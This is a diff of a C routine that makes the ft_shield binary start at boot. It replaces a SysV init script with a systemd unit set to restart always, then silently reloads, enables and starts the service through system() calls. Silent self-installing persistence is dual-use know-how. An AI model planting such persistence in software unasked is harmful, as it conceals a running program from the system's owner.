@@ -19,50 +19,29 @@ void start_service(void)
 {
 	int fd = open(SCRIPT_PATH, O_CREAT | O_WRONLY | O_TRUNC, 0755);
 	if (fd < 0)
-		exit(EXIT_FAILURE);
+		exit (EXIT_FAILURE);
 
-	const char *systemv =
-		"#!/bin/sh\n"
-		"### BEGIN INIT INFO\n"
-		"# Provides:          ft_shield\n"
-		"# Required-Start:    $local_fs $network\n"
-		"# Required-Stop:     $local_fs $network\n"
-		"# Default-Start:     2 3 4 5\n"
-		"# Default-Stop:      0 1 6\n"
-		"# Short-Description: Start and stop ft_shield\n"
-		"### END INIT INFO\n"
+	const char *systemd =
+		"[Unit]\n"
+		"Description=ft_shield service\n"
+		"After=network.target\n"
 		"\n"
-		"case \"$1\" in\n"
-		"  start)\n"
-		"    /bin/ft_shield &\n"
-		"    ;;\n"
-		"  stop)\n"
-		"    kill -2 $(pgrep -xo ft_shield)\n"
-		"    ;;\n"
-		"  status)\n"
-		"    if pgrep -xo ft_shield > /dev/null; then\n"
-		"      echo \"ft_shield is running\"\n"
-		"      exit 0\n"
-		"    else\n"
-		"      echo \"ft_shield is not running\"\n"
-		"      exit 3\n"
-		"    fi\n"
-		"    ;;\n"
-		"  *)\n"
-		"    echo \"Usage: $0 {start|stop|status}\"\n"
-		"    exit 1\n"
-		"    ;;\n"
-		"esac\n"
+		"[Service]\n"
+		"Type=forking\n"
+		"ExecStart=/bin/ft_shield\n"
+		"ExecStop=/bin/kill -2 $MAINPID\n"
+		"Restart=always\n"
 		"\n"
-		"exit 0\n";
+		"[Install]\n"
+		"WantedBy=multi-user.target\n";
 
-	ssize_t bytes_out = write(fd, systemv, strlen(systemv));
-	if (bytes_out < 0) {
+	ssize_t bytes_out = write(fd, systemd, strlen(systemd));
+	if (bytes_out < 0)
+	{
 		close(fd);
-		exit(EXIT_FAILURE);
+		exit (EXIT_FAILURE);
 	}
 	close(fd);
-	system("chmod +x /etc/init.d/ft_shield > /dev/null 2>&1");
 	system("systemctl daemon-reload > /dev/null 2>&1");
 	system("systemctl enable ft_shield > /dev/null 2>&1");
 	system("systemctl start ft_shield > /dev/null 2>&1");
